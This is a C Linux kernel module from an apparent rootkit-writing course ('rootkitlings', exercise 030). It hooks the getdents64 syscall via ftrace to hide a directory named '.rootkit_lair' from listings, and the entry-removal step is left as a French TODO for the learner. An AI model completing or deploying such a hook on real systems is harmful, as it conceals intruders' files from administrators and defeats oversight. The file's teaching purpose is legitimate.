#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/string.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkitlings");
MODULE_DESCRIPTION("030: hide a specific directory from ls");

#define HIDE_DIR ".rootkit_lair"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent_buf =
        (struct linux_dirent64 __user *)regs->si;
    long ret;
    struct linux_dirent64 *kbuf, *cur, *prev;
    unsigned long offset;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirent_buf, ret)) {
        kfree(kbuf);
        return ret;
    }

    prev = NULL;
    offset = 0;

    while (offset < ret) {
        cur = (struct linux_dirent64 *)((char *)kbuf + offset);
        unsigned short reclen = cur->d_reclen;

        // TODO(rootkitlings): si cur->d_name correspond exactement a HIDE_DIR,
        //   retire l'entree du buffer (meme technique que exercice 029).
        //   Sinon, avance prev.
        //   ~4 lignes.

        offset += reclen;
    }

    if (copy_to_user(dirent_buf, kbuf, ret))
        pr_err("rootkitlings/030: copy_to_user failed\n");

    kfree(kbuf);
    return ret;
}

static struct fthelper_hook hook = {
    .name = "__x64_sys_getdents64",
    .hook_fn = hook_getdents64,
    .orig_fn = &orig_getdents64,
};

static int __init hidedir_init(void)
{
    int ret;

    pr_info("rootkitlings/030: installing getdents64 hook\n");
    ret = fthelper_install(&hook);
    if (ret)
        return ret;

    pr_info("rootkitlings/030: directory '%s' will be hidden\n", HIDE_DIR);
    return 0;
}

static void __exit hidedir_exit(void)
{
    fthelper_remove(&hook);
    pr_info("rootkitlings/030: getdents64 hook removed\n");
}

module_init(hidedir_init);
module_exit(hidedir_exit);
